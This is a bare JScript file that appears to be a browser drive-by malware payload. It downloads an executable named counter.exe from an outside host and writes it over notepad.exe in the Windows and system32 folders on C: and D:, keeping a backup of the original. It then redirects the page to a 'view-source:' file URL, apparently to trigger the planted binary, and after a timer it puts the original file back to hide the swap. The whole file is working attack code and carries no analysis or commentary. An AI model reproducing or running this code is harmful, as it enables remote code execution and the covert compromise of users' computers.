var DoWR=new Function("obj1","obj2","obj1.Write(obj2.responseBody)");
var ldr = new ActiveXObject("Microsoft.XMLHTTP");
var origMP = new ActiveXObject("Microsoft.XMLHTTP");
ldr.Open("GET", "http://june.seproj.point.xxx-goto.net/loader/e/md/counter.exe",0);
ldr.Send();

var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
var g_Restored=0;

function FSave(path)
{
    DoWR(s,ldr);
    lpath = "file://"+path.replace(/[\\]/g,"/")+"notepad.exe";
    origMP.Open("GET", lpath,0);
    origMP.Send();
    s.SaveToFile(path+"notepad.exe",2);
    DoWR(s,origMP);
    s.SaveToFile(path+"notepad.exe.bak",2);    
}
function FRestore(path)
{
    var sv = new ActiveXObject("ADODB.Stream");
    sv.Mode = 3;
    sv.Type = 1;
    sv.Open();
    var tMP = new ActiveXObject("Microsoft.XMLHTTP");
    lpath = "file://"+path.replace(/[\\]/g,"/")+"notepad.exe.bak";
    tMP.Open("GET", lpath,0);
    tMP.Send();
    DoWR(sv,tMP);
    sv.SaveToFile(path+"notepad.exe",2); 
    g_Restored=1;
}
try{
    FSave("C:\\Windows\\");
}catch (e){};
try{
    FSave("D:\\windows\\");
}catch (e){};
try{
    FSave("C:\\windows\\system32\\");
}catch (e){};
try{
    FSave("D:\\windows\\system32\\");
}catch (e){};

location.href = "view-source:file://C:/";
function Restore() {
    if (g_Restored==1)
    {
	return;
    }
try {
    try{
        FRestore("C:\\windows\\");
    } catch (e) {};
    try{
        FRestore("D:\\windows\\");
    } catch (e) {};
    try{
        FRestore("C:\\windows\\system32\\");
    } catch (e) {};
    try{
        FRestore("d:\\windows\\system32\\");
    } catch (e) {};
} catch (e) {};
}
setTimeout("Restore()",1000);
    
